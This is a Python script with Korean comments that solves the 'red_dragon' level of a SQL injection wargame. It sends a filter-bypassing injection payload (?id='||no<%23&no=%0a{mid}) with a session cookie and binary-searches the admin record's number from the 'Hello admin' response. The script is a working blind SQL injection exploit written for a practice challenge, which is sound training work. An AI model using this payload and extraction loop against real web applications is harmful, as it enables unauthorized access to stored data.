import requests
from settings import session_id

url = "https://los.rubiya.kr/chall/red_dragon_b787de2bfe6bc3454e2391c4e7bb5de8.php"
cookies = {'PHPSESSID': session_id}

# 탐색 범위 설정(이진 탐색을 위한 left, right)
left = 100000000
right = 1000000000

# 이진 탐색 반복문
while True:
    # 현재 탐색 구간의 중앙값(mid) 계산
    mid = (left + right) // 2

    # SQL 인젝션 페이로드 구성:
    # - "?id='||no<%23&no=%0a{mid}" 형태로, no 파라미터를 통해 공격 시도
    paylod = f"?id='||no<%23&no=%0a{mid}"
    res = requests.get(url + paylod, cookies=cookies)

    # 만약 탐색 범위가 역전되었다면(왼쪽 인덱스 > 오른쪽 인덱스)
    # 현재 mid 값을 정답으로 보고 종료
    if left > right:
        anwser = mid
        print(f"find id: {anwser}")
        break

    # "Hello admin" 문구가 응답에 포함돼 있다면
    # - mid 값이 관리자 계정(조건)을 만족하므로, 더 작은 값 안에 있음
    if "Hello admin" in (res.text):
        right = mid - 1
    # "Hello admin" 문구가 없다면
    # - mid 값이 만족시키지 못했으므로, 더 큰 값으로 탐색 범위를 조정
    else:
        left = mid + 1
